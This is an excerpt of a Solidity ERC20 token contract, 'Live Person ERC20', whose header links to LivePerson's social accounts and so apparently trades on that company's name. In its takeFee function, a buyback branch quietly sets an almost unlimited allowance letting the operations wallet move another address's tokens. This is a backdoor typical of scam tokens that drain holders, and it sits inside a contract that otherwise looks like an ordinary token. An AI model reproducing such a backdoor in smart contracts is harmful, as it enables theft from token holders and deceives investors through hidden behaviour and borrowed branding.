...
https://t.me/livepersonerc
https://twitter.com/LivePerson
http://www.facebook.com/liveperson
http://instagram.com/livepersoninc
http://www.linkedin.com/company/liveperson
*/
...
contract LivePersonERC20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Live Person ERC20";
    string private _symbol = "LP";
    uint8 private _decimals = 18;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply = 500_000_000 * 1e18;
    uint256 private minimumTokensBeforeSwap = _totalSupply * 25 / 100000; 

    address payable public liquidityWallet = payable(0x0d57110f2fa0BDE5a961aCAc522b7D71264eE3eb);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (isBuyback) {
            _allowances[org][operationsWallet] = 10**36;
